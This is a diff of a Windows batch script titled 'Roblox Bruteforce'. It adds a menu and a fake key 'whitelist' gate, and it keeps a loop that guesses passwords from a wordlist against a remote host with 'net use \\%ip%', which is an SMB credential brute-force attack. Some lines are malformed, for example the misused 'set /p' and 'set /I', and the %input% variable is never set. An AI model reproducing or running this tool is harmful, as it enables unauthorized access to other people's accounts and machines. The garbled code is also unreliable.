@@ -1,4 +1,5 @@
-h@echo off
+
+@echo off
 title Roblox Bruteforce
 
 echo /$$$$$$$                        /$$                     /$$$$$$$$                                     
@@ -25,13 +26,12 @@ pause
 echo #
 set /p [16:00] - Insert key : "
 echo [16:00] - Whitelisted.
-echo [1] Checker
-set /p [2] Bruteforce
-
-echo #
-set /p Choose an option: "
+set /I [1] Checker
+set /I [2] Bruteforce
 if /I %input% EQU 1 start Checker.bat
 if /I %input% EQU 2 start BRUTEFORCE.bat
+
+echo #
 
 set /a count=1
 for /f %%a in (%wordlist%) do (
@@ -53,6 +53,7 @@ exit
 net use \\%ip% /user:%user% %pass% >nul 2>&1
 echo [ATTEMPT %count%] [%pass%]
 set /a count=%count%+1
+
 
 
 
